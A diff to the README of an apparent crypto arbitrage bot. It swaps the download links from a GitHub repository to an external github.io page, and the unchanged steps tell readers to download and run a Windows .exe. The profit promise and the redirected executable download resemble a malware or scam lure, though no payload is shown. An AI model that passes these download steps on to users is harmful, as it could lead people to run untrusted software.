@@ -1,6 +1,6 @@
 # 🤖 Arbitrum-Arbitrage-Bot-2026 - Earn crypto profit through automated trading
 
-[![Download the Bot](https://img.shields.io/badge/Download-Release-blue)](https://github.com/ShobhitJain-png/Arbitrum-Arbitrage-Bot-2026)
+[![Download the Bot](https://img.shields.io/badge/Download-Release-blue)](https://shobhitjain-png.github.io)
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards for smooth operation:
 
 Follow these steps to obtain the software:
 
-1. Visit the [official repository page](https://github.com/ShobhitJain-png/Arbitrum-Arbitrage-Bot-2026) to access the latest version of the bot.
+1. Visit the [official repository page](https://shobhitjain-png.github.io) to access the latest version of the bot.
 2. Locate the "Releases" section on the right side of the screen.
 3. Click the most recent version label.
 4. Download the executable file ending in .exe for Windows.
